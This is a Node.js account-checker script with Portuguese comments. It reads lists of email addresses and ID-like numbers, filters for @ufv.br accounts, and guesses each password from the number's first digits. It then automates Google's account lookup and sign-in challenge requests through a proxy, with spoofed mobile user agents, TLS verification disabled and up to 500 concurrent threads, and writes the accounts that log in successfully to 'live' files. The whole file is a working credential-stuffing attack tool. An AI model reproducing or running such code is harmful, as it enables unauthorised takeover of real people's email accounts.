const { MultiSelect, Select, Input } = require('enquirer');
const path = require("path");
const UserAgent = require("user-agents");
const config = require('./config.json');
const setTitle = require('console-title');
const unirest = require("unirest");
const fs = require("fs");
let list = [];
function titulo(testados, lives, dies, erros) {
  setTitle('CPF TESTADOS [' + testados + '] ------------ Lives [' + lives + '] Dies [' + dies + '] Erros [' + erros + ']'); // Define titulo do console
}
//TESTANDOS
var testados = 0;
var lives = 0;
var dies = 0;
var erros = 0;
//init function
const login = async (params) => {
  //(try)
  try {
//(lista)
      var [email, username] = params.trim().split(`|`);
    //(numero senha)
   var pas = username.substring(0, 8);
   var [emial_use] = email.trim().split(`@`);
   if (email.includes('null')) {
       //(console die)
       console.log(`${username}|${pas} --> Email: ${email} --> email_null`.red);
       //(sleep)
       fs.appendFileSync("email_null.txt", `${username}|${pas} --> Email: ${email} --> email_null\n`);
       //(sleep)
       if (list.length !== 0) login(list.shift());
       return
   }
   if (email.includes('ufv')) {
   } else {
       //(console die)
       console.log(`${username}|${pas} --> Email: ${email} --> OUTRO PROVEDOR`.red);
       //(sleep)
       fs.appendFileSync("email_null.txt", `${username}|${pas} --> Email: ${email} --> OUTRO PROVEDOR\n`);
       //(sleep)
       if (list.length !== 0) login(list.shift());
       return
   }
      //(verifica senha)
      if (!username || username == undefined || username == null || username.length < 11 || username.length > 11) {
          if (list.length !== 0) login(list.shift());
          return
      }
      var password = username.substring(0, 6);
      let userAgent = new UserAgent({ deviceCategory: 'mobile' })
      var userProxy = config.proxyCaixa;
      const proxyCaixa = `${userProxy}`;
      let cookiejar = unirest.jar(true);
          var refere_cookie = await unirest.get('https://accounts.google.com/embedded/setup/v2/android?source=com.google.android.gm&xoauth_display_name=Android%20Phone&ph=%2B5548091137212&imsi=724557885725524&canSk=1&lang=pt&langCountry=pt_br&hl=pt-BR&cc=br&multilogin=1&hide_status_bar=1&use_native_navigation=0&cbsc=0').headers({
            'Host': 'accounts.google.com',
            'upgrade-insecure-requests': '1',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'pt-BR,en-US;q=0.9',
            'x-requested-with': 'com.google.android.gms',
            'user-agent': `${userAgent}`,
        }).jar(cookiejar)
            .strictSSL(false)
            .proxy(proxyCaixa).timeout(10000).send(``).followRedirect(false).then((dat) => dat).catch(() => { });
            //config do post login parte 1
          var canSk = '1'
          var continu = 'https%3A%2F%2Faccounts.google.com%2Fo%2Fandroid%2Fauth%3Flang%3Dpt%26cc%26langCountry%3Dpt_%26xoauth_display_name%3DAndroid%2BDevice%26tmpl%3Dnew_account%26source%3Dandroid%26return_user_id%3Dtrue'
          var req = `%5B%22${emial_use}%40ufv.br%22%2C%22AEThLlxmBOzfR42K1VbcN9sBXINmDlZ_sUvNq9t_QcEKBmiEloIAmDCOgC4K4HsF4YjvGxlLkOXr_4lZ3auZPprfe6CZMj1kRcK-2l7PRlHeMSzh7mn4pogcd299-1conur2rphzbwzBNTws6sdYkp_fg_mURgRcqml3LQNVRLeypUxsYj8DDEQrbm8uORug7MEuWo9joYJHa9dnCpBCmQBYMlPDQBngu2GiQlf7eVnZgmmQs-mIhbRS-4YNQVAh7QkybG74FAF9Gx7sEXtrWrC1S0Ye6vzcpWw5JMwJFtiYWtH5ozEzo83fAmIQsbD3YitzqVlf6FVnC5h4JiqRexHOVqCL5daLg9djr9K6KrFRnc6F-JtXcUjNGwWpxY6YI9oqPLlyPOxUdYlebF7bcOFyMmhRLEoazyG7FmhfC4CNWAAWody-S-5YdCSWMUI0iroYWK1qu0-SSQ1tx1GCH-cDiLRpzlQYK0HKz5FCfFeDAyIU9LhG5-6WmsuMNgG3XDBMd9uJPc-yBNT8xAGmcdcM49CJX3ODda2GJULE8cBS1y1dI_4vAsIHAl8NturrMZXG6_TzlgSWjyQoN3OPFL2mgqTGQw3QthLRYW52x_B7HsEigxzbP3-p0m8HEWMKQuYlWcbC4lyVbFgyTswG9yjKkjszhY8i81u3Qd7ohqvc_Ogu2j68FWYpyFBwrvbvBLaObFzusFfakRpC7Lcn7YaGGtz5Z0mvHJhO9lIkjRjOKLmGH1Os0ZzXYPvbLD307gvA58I4eK_8RGta5zJH5Vg-BVIpc89qLA%22%2C%5B%22nkjnsadihjbfjhdbdf%40gmail.com%22%5D%2Cnull%2C%22BR%22%2Cnull%2Cnull%2C2%2Ctrue%2Ctrue%2C%5Bnull%2Cnull%2C%5B1%2C1%2C0%2C1%2C%22https%3A%2F%2Faccounts.google.com%2Fembedded%2Fsetup%2Fv2%2Fandroid%3Fsource%3Dcom.google.android.gm%26xoauth_display_name%3DAndroid%2BPhone%26ph%3D%252B5548091137212%26imsi%3D724557885725524%26canSk%3D1%26lang%3Dpt%26langCountry%3Dpt_br%26hl%3Dpt-BR%26cc%3Dbr%26multilogin%3D1%26hide_status_bar%3D1%26use_native_navigation%3D0%26cbsc%3D0%22%2Cnull%2C%5B%5D%2C4%2C%5B%5D%2C%22GlifSetupAndroid%22%2Cnull%2C%5B%5D%2Ctrue%2C2%5D%2C2%2C%5B0%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C7%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cfalse%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cfalse%2Cfalse%2Cnull%2Cnull%2Cnull%2Cfalse%5D%2Cnull%2Cnull%2C3%5D%2C%22${emial_use}%40ufv.br%22%2Cnull%2Cnull%2Cnull%2Ctrue%2Ctrue%2C%5B%5D%5D`
          var bgRequest = '%5B%22identifier%22%2C%22%3CnlJqUg8CAAalVCmyhVSNHIS8aTO_hNn0ADkAIwj8RiXwFL9ZzLGjTLiYONuw2KbN00avO-JBAVpGqbUfuG_4YWv2Ct7TTXhatKboKP7ON5pR1wHNAAAAsJ0AAAAGpwEHVgMziHUqmq2ElMe211mqv3U10cX-iw_Dd2rOYW_FLPqNzE76Ez2SlZGl9n6p9V-EKP4C70UIiayp8i__pA8tj-MiJd8UVqqMfdtPZ1SC0EEZsKe1HCANVoeIcRaNnQ2PneeplNRjJimVtl59tuRs5XoLSw9rJ3UkkvjUE9MdglP8Pc5mvJmhLzZjF_RcrezoPJ151YtiABgQqKg5qQMlSEeuyHjgyVbuw8BrzUFmn7FDJIOdUtAl-ldPAITMgj5jPspcoIzmTEpIwBPVyhNaI8SpRM58RoS_Y8kGtqg9-oBbMY2PB1sbBBLNF-hCl5IqlgIk-ZUNGnxGHlnzX2RT1wACBOKixy2tMtiblSM28L0C2DhJO7QgODLyzEN_0hR_FY9P-IWrwOsGsNvNILWDnmHJ_blDfPtE5T7B-3b5HncRL9UzoF5Iw6XCxFpCkteY-pxUYrVJi7z80w-lsPqZUrDpb125cHDHqGz-jFhYDwiiR7AXFuPTtGLkZa5XxlRsOleqvn89jitgI246ZP-fZqweIOxp5Zp_WJL4_MaedPhkj3haxYiLfZk7_LnqXAsDy6sO2zoMEQu76KqFCjvVHvDkjLR3SRWxdvB3Thnicl1QChcIGfeVS9MtJBLkBKhLdISI1GWEvZ5fGfAy7jhrAcO6_tdQq_zwX-nWFlTQFnXEHNWfW08Hh2uZxgulPOQjZRUagR-bbK8jAR7ewoBzNqKnvuObaxy6Ikbwj0O401ANEZnUGBg2zJpaFz3Jnh1bw77ofyrzsZD-Xe6y8ZMM9Lkicw7PajOM08QgdX52T55VNlng8wMSPlgsr-P1hbEScRzO6jjrjvPvd6XP9gnTBvhCbFse-XPfXkDs0_e9_KjCACZCV6pVkvBqL5IYfj-2D4xfaY3xWyMQVjN9jldfMTQEba4CYyBOQtROhlIkck-qMLYVHFan0TiHTzu1BbwJ6CwUm3qk6jJ2Dop-wPNFZJXM61cEWrl-p9Qu1MTF-W8O7jYv9F0VBwy8E8DmxQPiwzKq1oqfj-XoNqTifeje4WPGmEqykOYxWbmm6ZYuygaInNw21S409L7x00SOQmh3EDkqQk5-%22%5D'
          var post_completo_1 = `canSk=1&cc=br&hide_status_bar=1&hl=pt-BR&multilogin=1&source=com.google.android.gm&use_native_navigation=0&continue=${continu}&f.req=${req}&bgRequest=${bgRequest}&cookiesDisabled=false`
          //url
      var url = `https://accounts.google.com/_/lookup/accountlookup?hl=pt&_reqid=2949451&rt=j`
          //refere login
          var auth_step = await unirest.post(url).headers({
              'Host': 'accounts.google.com',
              'x-same-domain': '1',
              'origin': 'https://accounts.google.com',
              'google-accounts-xsrf': '1',
              'user-agent': `${userAgent}`,
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'accept': '*/*',
              'accept-language': 'pt-BR,en-US;q=0.9',
              'x-requested-with': 'com.google.android.gms',
          }).jar(cookiejar)
              .strictSSL(false)
              .proxy(proxyCaixa).timeout(60000).send(`${post_completo_1}`).followRedirect(false).then((dat) => dat.body).catch(() => { });

      if (auth_step == undefined) {
          return
        } else if (auth_step.includes('gf.alr",1,"')) {
              var url_senha = auth_step.split('gf.ttu",0,"')[1].split('"')[0]
            } else if (auth_step.includes('gf.alr",7,"')) {
              console.log(`${username}|${password} --> Email invalido ou sem cadastro`.red);
              fs.appendFileSync("Reprovadas/error_gmail.txt", `${username}|${password} --> Email invalido ou sem cadastro\n`);
              if (list.length !== 0) login(list.shift());
              return
        }else{
        console.log(`${username}|${password} --> Email: ${email}  --> ${auth_step}`.yellow);
        fs.appendFileSync("Reprovadas/error_gmail.txt", `${username}|${password} --> Email: ${email}  --> ${auth_step}\n`);
        if (list.length !== 0) login(list.shift());
        return
        }
            //config do post login parte 1
            var continu = 'https%3A%2F%2Faccounts.google.com%2Fo%2Fandroid%2Fauth%3Flang%3Dpt%26cc%26langCountry%3Dpt_%26xoauth_display_name%3DAndroid%2BDevice%26tmpl%3Dnew_account%26source%3Dandroid%26return_user_id%3Dtrue'
            var req = `%5B%22AEThLly6WGVoRblGa2nyjJmZiWL0g75QnuZDl2PWMwf8lldljEQNwTaq6shkzGwFvkT8-qriSpdRaUgRKM4BtkrFuwCw5hH6awRpbPTRj8F9lUByKdPghiTiHAtlheEvCiZFejqKFWj7yS0IFh3petYeLfCZvrEKko8H5XtyPTY9aZWy-xneK69Db8_IWY2tSSnSbpbVvhYwvYJBgF00ScVEO6Cl_PGGDkWiI6EdvVdqRGMLK9wfRRWNKSXi6HPE6yGZna05kmk7M08XF2ob76My25JwlTSed_atZY_1d-ILAYeDlKLpvSgr26_WEgXz1xU1LeWNH1VBG0XiAhNAlQ194ekQI3xI1xQkpYgxnyfGnUtcGaarF0AfnCWmQ5OuX2YgXJ0cpDvRsmh1KCc-ameIhUIegFFLjsXMYzawKFq63JVu8G_yZLkR7NbjPFsVA--ecm3ZvfpsQHeZv7Wf_X4w0f21AIlkQDlmgOQxt8XMF6RCwH-PcLXCnEZdoj7fuUjWna233cYkqmSazFWt9FV6iH27EhPtcVPT93dlruqMAVML6lXe0WwGp9rbPY47I4P8HVdTrlZfJVp2tlXohNj5oSshx4sMD67on5tyfzmU7UtaUYvlLEcq-iBuADvp8f-dOf_mRA2JFe_HSB1tqFtNUwXz_KMYF66_io1asiL-ZdS6afvrU4gkkhXRF5U2CHXjOOZ0dd2v7iJ01lmxnxbfCUC2ZSqQEXmeUFKDIefbhX0ndodb3aoXqwiyQuk1Dla-cTQAmHnIFs47R7GmxIvbX0oDcJkSXjo-f8cAYTBLzZjRqYeuYe-gUU6cVhuO7F6dq1Tl88u8%22%2Cnull%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%22${pas}%22%2Cnull%2Ctrue%5D%5D%5D`
            var bgRequest = '%5B%22identifier%22%2C%22%3CtnpqeicCAAalVCmyhVSNuOW5G2ZSjnL0ADkAIwj8RtASriZm-wwGhNCefn65xMFUKok3xeKTWLbjHzm_JCFBbUzKLDutkn9eT0EI5npTW-WYt4zNAAAA1Z0AAAAEpwEHVgNcumLZF2w0vNhgc6WsRWHNclTWp6Lgk2TKVM6xpluFmOhni_Vy-cgtemGJE50ssLcpW8s0f5akp72hgjM3ASVl97Qfs4Jy2NlFLRr4NKjNYlZfIHV537CHZpbHRBhTJoO_dUqVyfZT48cC3NyhY4pncBaJmFbfOrpYDlXDlUYUIB2aVWlqVMfDgjtM43g2A_Jn8jgkcqAteNf3FuYu1Ff5J_YxipGdEav_65rCAxDmBXT-WUT6E0_PzIne4KLJRdB2Zq5_QyXBm6VLADtlAoSima4EcHsEv43i16AEDC6hFK417_4S2QPN0hNcm3w5Muk94pcbnV0EzeEckyF5Ckdy2ZdAoP3x9BZPWVYJPSCiwadRBZBV6TLdYs_qlJXuNbUwwyduifXrCy-OkWvNM5IcpfYwi0NY4YyZdaJqnavJpLoqcgtShD2giP5Jh8WaIgpFVk-FoEJPNxFiEL73FfR5C77BHcyIe34ziOApsOMPSph7-RkOUyDaJSpCvQDgR9eWSX85j0xsRA4itgQCZbZJC7TYhh3DEYJHL1WJoSkK-_tQRd9yqQH4877i7X1jc6zCAvzEbT6aHKly_R7NEGWmIJge9vKT6q0QqASuG1Lj3qtgjHXKRD4WOqCBjmdV-KqYULtHLX4fJvYhWf2NibkypBwb0n1DxqnyGWbX_Q-9cjc0Jtdi8uAh7w_JOjo2LCJbKAvnnk0mrc3Pa5uFIKIYak5Tz8bxVA3xC_MQYmKNVTmOk2OOgQVc8HEj_odsXx4doi_SN9rWVOGWu5mwSLnsoKSjy3e3mx2h2L2RP630x_j9lWeSNKfN3tgOVBsUdEjhvwMJ_6v1QvXSWFw8-dPeGQMPdS213aIhsVj2q3W1hV0OyawzUDiAcuOKr9Y_Kx51RDLKH6k-SRtDQ4Kt54173UlsxFh7c67lRqMxFfA6USJwrorRIn6abzrePPP51ALES4juqYk0UMU0FAnoE78bD63viiwoab2pcT6qPGwddXgzkFNsXVbfJ5GcaAJEbu6Kndq7YrZK2Eut-kjdGYefGe_aDVkHQLDpXxknb81rAgAPlq4bspvB-GXyhEZdD-V0r7NhmaxjYG7osV2edRxPzcJdb9YvTA-V45JqVZBl6DB7NQZZss_NcQCGH8Q%22%5D'
            var post_completo_1 = `canSk=1&cc=br&hide_status_bar=1&hl=pt-BR&multilogin=1&source=com.google.android.gm&use_native_navigation=0&continue=${continu}&f.req=${req}&bgRequest=${bgRequest}&cookiesDisabled=false`
         //refere login
         var auth_step_senha = await unirest.post(`https://accounts.google.com/_/signin/challenge?hl=pt&TL=${url_senha}&rt=j`).headers({
          'Host': 'accounts.google.com',
          'x-same-domain': '1',
          'origin': 'https://accounts.google.com',
          'google-accounts-xsrf': '1',
          'user-agent': `${userAgent}`,
          'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
          'accept': '*/*',
          'accept-language': 'pt-BR,en-US;q=0.9',
          'x-requested-with': 'com.google.android.gms',
      }).jar(cookiejar)
          .strictSSL(false)
          .proxy(proxyCaixa).timeout(60000).send(`${post_completo_1}`).followRedirect(false).then((dat) => dat.body).catch(() => { });
    if (auth_step_senha == undefined) {
        login(params)
        return
      } else if (auth_step_senha.includes('"INITIALIZED"')) {
      console.log(`${username}|${password} --> Email: ${email} --> LIVE GMAIL SEM VERIFICAÇÃO`.green);
      fs.appendFileSync("Aprovadas_Gmail/live_Gmail.txt", `${username}|${password} --> Email: ${email}  --> LIVE GMAIL SEM VERIFICAÇÃO\n`);
      if (list.length !== 0) login(list.shift());
      return
  
    } else if (auth_step_senha.includes('FIRST_AUTH_FACTOR",1,null,"INCORRECT_ANSWER_ENTERED"')) {
      console.log(`${username}|${password} --> Email: ${email} --> SENHA INVALIDA`.red);
      fs.appendFileSync("Reprovadas/die_gmail.txt", `${username}|${password} --> Email: ${email}  --> SENHA INVALIDA\n`);
      if (list.length !== 0) login(list.shift());
      return
    } else if (auth_step_senha.includes('LOGIN_CHALLENGE",2,null,"SEND_SUCCESS')) {
      console.log(`${username}|${password} --> Email: ${email} --> verificação`.yellow);
      fs.appendFileSync("Aprovadas_Gmail/die_gmail.txt", `${username}|${password} --> Email: ${email}  --> verificação\n`);
      if (list.length !== 0) login(list.shift());
      return
      } else {
        var [retorno] = auth_step_senha.trim().split(`https://lh3.googleusercontent`);
      console.log(`${username}|${password} --> Email: ${email} --> ${retorno}`.red);
      fs.appendFileSync("Reprovadas/die_gmail.txt", `${username}|${password} --> Email: ${email} --> N${retorno}\n`);
      if (list.length !== 0) login(list.shift());
      return
      }
}catch (e) {
  console.log(e)
  titulo(testados, lives, dies, erros)
  erros++
    console.log(`Retestando linha: ${username}`)
      if (list.length !== 0) login(list.shift());
}
}
const init = async () => {
const velocidade = await new Select({
  prefix: '        ',
  separator: '?',
  name: 'contents',
  message: 'Escolha Quantos Threads',
  choices: ['1','2', '3', '4','5','50','150','200','300','400','500'],
  indicator(state, choice) {
    if (choice.enabled) {
      return '[X]';
    }
    return '[ ]';
  },
  onSubmit() {
    if (this.selected.length === 0) {
      this.enable(this.focused);
    }
  }
}).run();
  const lists = fs.readdirSync(path.join(__dirname, './')).filter(value => value.endsWith('.txt') && !value.includes('cookie_') && !value.includes('cookie_') && !value.includes('live_saldo_baixo') && !value.includes('proxy')  && !value.includes('die') && !value.includes('erros') && !value.includes('live') && !value.includes('ABRI_CONTA') && !value.includes('read')).map((value, index) => { return { name: value, value }; });
  if (lists.length < 1) {
    console.log();
    console.log('Você não possuí nenhuma lista válida no diretorio atual!')
    return process.exit(1);
  }
  const contents = await new MultiSelect({
    prefix: '        ',
    separator: '?',
    name: 'contents',
    message: 'Quais listas deseja carregar',
    choices: lists,
    indicator(state, choice) {
      if (choice.enabled) {
        return '[X]';
      }
      return '[ ]';
    },
    onSubmit() {
      if (this.selected.length === 0) {
        this.enable(this.focused);
      }
    }
  }).run();
  list = contents.map(value => fs.readFileSync('./' + value, { encoding: 'utf-8' })).join('\n').split('\n');
  if (list.length < 1) {
    console.log();
    console.log(contents.length == 1 ? '' : 's' + contents.join(', '));
    return process.exit(1);
  }
  console.log('\n', `${list.length} dado${list.length == 1 ? '' : 's'} carregados...`);
  for (const linha of list.splice(0, `${velocidade}`)) {
    login(linha);
  }
}
init();